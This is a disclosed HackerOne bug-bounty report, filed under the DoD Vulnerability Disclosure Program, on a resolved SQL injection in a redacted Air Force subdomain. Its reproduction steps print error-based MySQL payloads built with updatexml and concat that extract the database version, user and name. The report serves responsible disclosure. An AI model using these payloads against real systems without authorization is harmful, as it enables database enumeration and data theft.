---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2022-05-12
submitted: 2017-10-15T12:16:38.080Z
bounty_usd: null
votes: 21
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "cdl"
source: "https://hackerone.com/reports/277380"
title: "SQL Injection on █████"
---
# SQL Injection on █████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 21 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-05-12

- Report: [https://hackerone.com/reports/277380](https://hackerone.com/reports/277380)
- CWE: SQL Injection
- Submitted: 2017-10-15T12:16:38.080Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

#### Background:
It looks like the patch for #231338 has been reverted and this subdomain is yet again vulnerable to SQL injection.

### Summary:
An Airforce subdomain is vulnerable to SQL Injection because the application does not produce sufficient validation on user input. This allows an attacker to execute SQL queries.

### Description:
The `███=` parameter on `https://███████/█████████` does not properly sanitize ' characters, allowing an attacker to execute SQL queries!

### Impact

This could potentially expose sensitive information because an attacker could potentially dump the databases on this server!

### Step-by-step Reproduction Instructions

    1.) Open Firefox or any browser
    2.) Visit `https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil`
    3.) You will see the MySQL version in the response => `██████████`

User - `███████`
payload => `https://████████/████████████=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil`

Database - `████`
payload => `https://██████/█████████████=%27%20and%20updatexml(null,concat(0x0a,database()),null)--%20-@hackerone.mil`

██████
### Suggested Mitigation/Remediation Actions

Sanitize input!

Thanks!
- Corben Douglas [@sxcurity](https://twitter.com/sxcurity)

## Timeline

- **Report Filed**
- **2017-10-15** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-10-19** @cdl: Hey team!
Are you guys able to verify this issue?

Regards,
Corben Douglas
- **Report Severity Updated**
- **Report Triaged**
- **2017-10-19** @cdl: Fantastic! Thanks for the quick response @mqoliver!
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
